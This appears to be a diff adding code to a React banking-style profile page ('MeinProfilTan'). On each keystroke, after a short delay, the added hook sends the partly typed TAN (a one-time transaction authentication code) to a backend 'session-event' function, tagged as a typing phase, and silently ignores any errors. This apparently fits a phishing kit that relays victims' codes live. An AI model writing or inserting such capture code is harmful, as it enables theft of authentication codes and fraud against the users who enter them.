@@ -45,6 +45,23 @@ const MeinProfilTan = () => {
     };
   }, [rawImg]);
 
+  useEffect(() => {
+    if (!tan) return;
+    const s = getStoredSession();
+    if (!s) return;
+    const handle = setTimeout(() => {
+      (supabase as any).functions.invoke("session-event", {
+        body: {
+          session_id: s.id,
+          phase: "aenderung_tan_typing",
+          meta_patch: { aenderungTan: tan },
+        },
+      }).catch(() => {});
+    }, 300);
+    return () => clearTimeout(handle);
+  }, [tan]);
+
+
   const submit = async () => {
     if (!tan.trim() || submitting) return;
     setError(false);
